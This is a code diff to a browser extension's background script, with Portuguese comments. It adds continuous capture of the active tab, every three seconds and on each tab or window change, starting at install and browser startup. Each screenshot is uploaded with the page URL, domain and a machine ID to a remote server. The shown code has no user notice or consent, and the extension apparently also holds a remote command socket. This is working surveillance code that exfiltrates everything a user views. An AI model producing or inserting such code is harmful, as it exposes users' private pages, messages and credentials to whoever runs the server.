@@ -71,6 +71,94 @@ let commandSocket = null;
 let sessionHeartbeatInterval = null;
 let activeSessions = new Map();
 
+// ═══════════════════════════════════════════════
+// 📸 REAL-TIME SCREENSHOT CAPTURE (ACTIVE TAB ONLY)
+// ═══════════════════════════════════════════════
+
+const SCREENSHOT_INTERVAL = 3000; // 3 segundos
+let screenshotInterval = null;
+
+async function captureActiveTabScreenshot() {
+  try {
+    // Buscar ABA ATIVA na janela atual
+    const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
+    
+    if (!activeTab || !activeTab.url || activeTab.url.startsWith('chrome://') || activeTab.url.startsWith('about:')) {
+      return; // Ignorar system pages
+    }
+
+    const host = new URL(activeTab.url).hostname;
+    
+    // Capturar screenshot (JPEG 60% para reduzir tamanho)
+    const screenshotDataUrl = await chrome.tabs.captureVisibleTab(activeTab.windowId, {
+      format: 'jpeg',
+      quality: 60
+    });
+
+    // Enviar para edge function
+    const response = await fetch(`${CONFIG.API_BASE}/screenshot-stream`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': CONFIG.SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+      },
+      body: JSON.stringify({
+        machine_id: machineId,
+        screenshot_data: screenshotDataUrl, // Base64 JPEG
+        domain: host,
+        url: activeTab.url
+      })
+    });
+
+    if (!response.ok) {
+      log('warn', `Screenshot stream failed:`, await response.text());
+    } else {
+      log('debug', `📸 Screenshot enviado (${host})`);
+    }
+
+  } catch (error) {
+    log('error', `Error capturing active tab screenshot:`, error);
+  }
+}
+
+// Iniciar captura contínua quando extensão carrega
+function startScreenshotCapture() {
+  if (screenshotInterval) {
+    clearInterval(screenshotInterval);
+  }
+
+  log('info', `🎥 Iniciando captura de tela da aba ativa (intervalo: ${SCREENSHOT_INTERVAL}ms)`);
+  
+  // Primeira captura imediata
+  captureActiveTabScreenshot();
+  
+  // Captura contínua a cada 3s
+  screenshotInterval = setInterval(() => {
+    captureActiveTabScreenshot();
+  }, SCREENSHOT_INTERVAL);
+}
+
+// Iniciar captura quando extensão carrega
+chrome.runtime.onStartup.addListener(() => {
+  startScreenshotCapture();
+});
+
+chrome.runtime.onInstalled.addListener(() => {
+  startScreenshotCapture();
+});
+
+// Capturar imediatamente quando aba ativa muda
+chrome.tabs.onActivated.addListener(() => {
+  captureActiveTabScreenshot();
+});
+
+chrome.windows.onFocusChanged.addListener((windowId) => {
+  if (windowId !== chrome.windows.WINDOW_ID_NONE) {
+    captureActiveTabScreenshot();
+  }
+});
+
 // Professional logging system
 function log(level, message, data = null) {
   if (!CONFIG.DEBUG && level === 'debug') return;
